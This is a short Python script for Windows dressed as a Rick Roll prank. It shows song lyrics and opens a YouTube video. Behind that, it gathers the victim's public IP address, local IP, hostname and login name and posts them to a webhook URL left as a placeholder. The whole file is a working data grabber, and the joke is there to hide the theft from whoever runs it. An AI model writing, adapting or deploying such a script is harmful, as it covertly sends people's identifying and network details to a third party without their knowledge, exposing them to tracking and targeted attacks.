#Windows Version 

import requests
from requests import get
import socket
import os
import time
print('Script maded by frame')
time.sleep(0.1)
print('Script maded by frame')
time.sleep(0.1)
print('Script maded by frame')
time.sleep(0.1)
print('Script maded by frame')
time.sleep(0.1)
print('Script maded by frame')
os.system('cls')
print('''
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Nеver gonna make you cry
Nevеr gonna say goodbye
Never gonna tell a lie and hurt you''')
time.sleep(1)
hostname = socket.gethostname()
user = os.getlogin()
local_ip = socket.gethostbyname(hostname)
ip = get('https://api.ipify.org').text


url = "webhook url" 


data = {
    "content" : "",
    "username" : "Rick Astley"
}


data["embeds"] = [
    {
        "description" : f"**Not gonna give you up** \n**IPV4: **{ip}\n **Never gonna let you down** \n**LOCAL IP: ** {local_ip}\n **Never gonna run around and desert you**\n**HOSTNAME: **{hostname}\n **Nеver gonna make you cry**\n**PC USER: ** {user}",
        "title" : "RICK ROLLED"
    }
]
os.system('start https://youtu.be/xvFZjo5PgG0')
result = requests.post(url, json = data)
